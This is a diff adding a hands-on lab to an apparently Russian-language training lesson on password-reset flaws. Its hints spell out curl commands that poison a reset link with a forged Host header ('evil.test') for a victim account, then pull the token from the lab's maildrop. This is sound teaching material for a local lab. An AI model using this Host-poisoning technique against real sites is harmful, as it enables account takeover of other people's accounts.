@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 38
 summary: "Уязвимости сброса пароля: poisoning через Host/X-Forwarded-Host, слабые токены, enumeration, takeover аккаунта."
+lab:
+  kind: shell
+  title: "Практика: сброс пароля через Host"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Запусти сброс, подставив свой Host: `curl -s -X POST 'http://shop.local/password-reset' -d 'email=victim@shop.local' -H 'Host: evil.test'`.
+    - Письмо лежит в мейлдропе лабы: `curl -s 'http://shop.local/maildrop'`.
+    - В ссылке сброса есть параметр `token=` — это и есть флаг.
+    - `curl -s 'http://shop.local/maildrop' | grep token= | cut -d= -f2 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
